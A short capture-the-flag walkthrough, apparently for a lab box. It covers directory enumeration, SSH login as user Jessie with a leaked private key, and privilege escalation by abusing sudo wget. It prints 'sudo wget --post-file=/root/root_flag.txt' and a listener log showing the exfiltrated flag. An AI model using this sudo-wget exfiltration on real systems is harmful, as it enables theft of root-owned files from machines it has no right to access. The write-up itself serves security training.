1. Run gobuster, found `/sitemap`
2. Run gobuster on `/sitemap`, found `.ssh` and `.DS_Store`
3. Find username Jessie on `/` apache default page source code. Then use private key to login as Jessie
4. The server is runnign CUPS(ipp) on localhost, and we can run wget with sudo, so may need [this](https://book.hacktricks.xyz/pentesting/pentesting-printers/file-system-access)
5. Found we can run wget using sudo, so use `--post-file` to bring the root flag as post data.
```bash
$ sudo wget --post-file=/root/root_flag.txt 10.9.1.235

$ python3 server.py 8000
INFO:root:Starting httpd...

INFO:root:POST request,
Path: /
Headers:
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.1.235:8000
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

Body:
b1b968b37519ad1daa6408188649263d
```
